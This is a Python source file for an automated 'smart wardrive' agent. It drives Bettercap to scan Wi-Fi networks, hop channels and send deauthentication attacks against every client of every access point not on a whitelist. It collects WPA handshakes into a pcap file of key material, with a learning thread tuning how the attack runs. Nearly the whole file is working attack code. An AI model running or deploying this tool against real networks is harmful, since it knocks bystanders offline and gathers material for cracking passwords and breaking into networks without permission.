from spartan import scan
from spartan import capture
from spartan.smart import state, learn
from spartan.utils import post, get, delete_events

import requests
import json
import subprocess
import os
import time
import signal
import yaml
import _thread

API_COOLDOWN = 5

class Agent(learn.Trainer):
    def __init__(self, parameters):
        self.parameters = parameters
        self.current_channel = 0
        self.access_points = []
        self.ap_whitelist = []

        learn.Trainer.__init__(self, parameters)    # Train the AI and update parameters
        self.state = state.State(parameters)        # Wireless spectrum state

        # Define a unique .pcap for the wardrive session
        self.session_pcap = './key_material/wardrive_session_' + \
            time.strftime("%Y%m%d%H%M%S", time.gmtime()) + '.pcap'

    # Reset parameters
    def reset_parameters(self):
        post('set wifi.rssi.min ' + str(self.parameters['min_rssi']))
        post('set wifi.sta.ttl ' + str(self.parameters['station_ttl']))
        post('set wifi.ap.ttl ' + str(self.parameters['ap_ttl']))

        post('set wifi.handshakes.file ' + self.session_pcap)

    # Return a dictionary with APs per channel sorted by populated
    def get_aps_per_channel(self):
        self.access_points.sort(key=lambda ap: ap['channel'])

        aps_per_channel = {}
        for ap in self.access_points:
            if ap['hostname'] not in self.ap_whitelist:
                channel = ap['channel']

                if channel not in aps_per_channel:
                    aps_per_channel[channel] = [ap]
                else:
                    aps_per_channel[channel].append(ap)

        return sorted(aps_per_channel.items(), key=lambda kv: len(kv[1]), reverse=True)

    # Channel hopping
    def set_channel(self, channel):
        if self.state.did_deauth:
            wait = self.parameters['hop_recon_time']
        else:
            wait = self.parameters['min_recon_time']

        if channel != self.current_channel:
            time.sleep(wait)                # Wait for the loot
            post('wifi.recon.channel ' + str(channel))
            print('\nHOP TO CHANNEL ' + str(channel))
            self.state.track(hop=True)
            self.current_channel = channel
            self.state.did_deauth = False   # Did deauth in the previous channel

    # Check if handshakes has been captured successfully or missed APs
    def track_state_events(self):
        handshake_json = []

        events = get('events')
        for event in json.loads(events.text):
            if event['tag'] == 'wifi.client.handshake':
                handshake_json.append(event['data'])
            if event['tag'] == 'wifi.ap.lost':
                self.state.track(miss=True)
            if event['tag'] == 'wifi.ap.new':
                self.state.track(new=True)

        if handshake_json:
            self.state.track(handshake=True, increment=len(handshake_json))
            print('\nCaptured handshakes in this state:')
            for handshake in handshake_json:
                    if (handshake['full']):
                        print('Captured full handshake of client ' + handshake['station'])
                    elif (handshake['half']):
                        print('Captured half handshake of client ' + handshake['station'])

        delete_events()

    # Automated function to wardrive
    def wardrive(self):
        with open('wifi_whitelist.txt') as f:
             self.ap_whitelist = f.readlines()
             self.ap_whitelist = [ap.strip() for ap in self.ap_whitelist]

        print('APs that are not going to be attacked: '+ str(self.ap_whitelist))

        # Start the model training and learning in another thread
        _thread.start_new_thread(self.train, ())

        post('wifi.recon on')

        while True:
            recon_time = self.parameters['recon_time']

            self.current_channel = 0
            post('wifi.recon.channel clear')
            post('wifi.assoc all')
            time.sleep(recon_time)

            # JSON with the APs information
            aps_request = get('session/wifi')
            self.access_points = json.loads(aps_request.text)['aps']

            channels = self.get_aps_per_channel()

            for channel, aps in channels:
                self.set_channel(channel)

                for ap in aps:
                    print('\nAccess Point: ' + ap['hostname'])
                    post('wifi.assoc ' + ap['mac'])

                    # Deauth all clients of the AP
                    n_clients = len(ap['clients'])
                    if n_clients > 0:
                        for client in ap['clients']:
                            print('Deauth attack against client: ' + client['mac'])
                            post('wifi.deauth ' + client['mac'])
                            self.state.track(deauth=True)

            self.track_state_events()
            self.state.next_state()

# Start the smart wardrive module
def start(args):
    #Deploy the Bettercap API
    bettercap = subprocess.Popen(['bettercap', '-caplet', 'http-ui'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    time.sleep(API_COOLDOWN) # Time needed to start requesting data without errors

    try:
        # Load agent parameters
        with open('parameters.yaml') as f:
            parameters = yaml.load(f)

        agent = Agent(parameters=parameters)
        agent.reset_parameters()
        agent.wardrive()

    except Exception as e:
        print(e)

    # Stop the Bettercap API
    finally:
        try:
            os.killpg(os.getpgid(bettercap.pid), signal.SIGTERM)
        except ProcessLookupError:
            exit()
